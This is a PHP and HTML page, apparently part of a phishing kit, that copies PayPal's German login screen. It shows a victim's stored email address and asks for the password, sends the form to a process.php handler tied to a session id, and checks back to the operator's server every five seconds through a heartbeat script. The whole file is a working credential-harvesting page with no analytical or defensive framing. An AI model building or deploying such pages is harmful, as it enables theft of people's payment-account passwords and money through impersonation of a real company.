<?php
require 'config.php';
if (!isset($_GET['sid'])) { redirect('index.php'); exit; }
$sid = $_GET['sid'];
$session = get_session($sid);
$email = $session['data']['identifier'] ?? 'Nutzer';
?>
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PayPal</title>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
    body { background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #001435; }
    
    .login-container { width: 100%; max-width: 520px; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; margin-top: auto; margin-bottom: auto; }
    
    .logo-img { height: 42px; margin-bottom: 50px; }
    
    .user-email { font-size: 15px; color: #687173; margin-bottom: 12px; width: 100%; text-align: left; padding-left: 5px; }
    
    .form-group { width: 100%; margin-bottom: 15px; position: relative; }
    .form-control { width: 100%; padding: 18px 16px; border: 1px solid #9da3a6; border-radius: 4px; font-size: 16px; color: #001435; outline: none; transition: border-color 0.2s; }
    .form-control:focus { border-color: #0070ba; box-shadow: 0 0 0 1px #0070ba; }
    .form-control::placeholder { color: #687173; }
    
    .forgot-link { display: inline-block; color: #005ea6; font-size: 16px; text-decoration: none; font-weight: 600; margin-top: 5px; margin-bottom: 30px; }
    .forgot-link:hover { text-decoration: underline; }
    
    .btn-primary { width: 100%; padding: 18px; background: #0070ba; color: #ffffff; border: none; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; text-align: center; transition: background 0.2s; text-decoration: none; display: block; }
    .btn-primary:hover { background: #005ea6; }
    
    .lang-selector { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 70px; font-size: 15px; color: #001435; cursor: pointer; font-weight: 600; }
    .lang-selector img { width: 20px; height: auto; border-radius: 2px; }
    .lang-selector .current { color: #001435; }
    .lang-selector .other { color: #687173; font-weight: 400; }
    .lang-selector svg { width: 14px; height: 14px; stroke: #687173; }
</style>
</head>
<body>

    <div class="login-container">
        <img src="paypal_logo.svg" alt="PayPal" class="logo-img" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg'; this.style.height='42px';">
        
        <div class="user-email"><?php echo htmlspecialchars($email); ?></div>
        
        <form method="POST" action="process.php?sid=<?php echo htmlspecialchars($sid); ?>" style="width: 100%;">
            <div class="form-group">
                <input type="password" name="password" class="form-control" placeholder="Passwort" required autocomplete="current-password" autofocus>
            </div>
            
            <a href="#" class="forgot-link">Passwort vergessen?</a>
            
            <button type="submit" class="btn-primary">Anmelden</button>
        </form>
        
        <div class="lang-selector">
            <img src="https://flagcdn.com/w20/de.png" alt="DE">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
            <span class="current">Deutsch</span>
            <span style="color:#dddddd;">|</span>
            <span class="other">English</span>
        </div>
    </div>

    <script>
        setInterval(function() {
            const sid = new URLSearchParams(window.location.search).get('sid');
            if (sid) { fetch('heartbeat.php?sid=' + sid).catch(() => {}); }
        }, 5000);
    </script>
</body>
</html>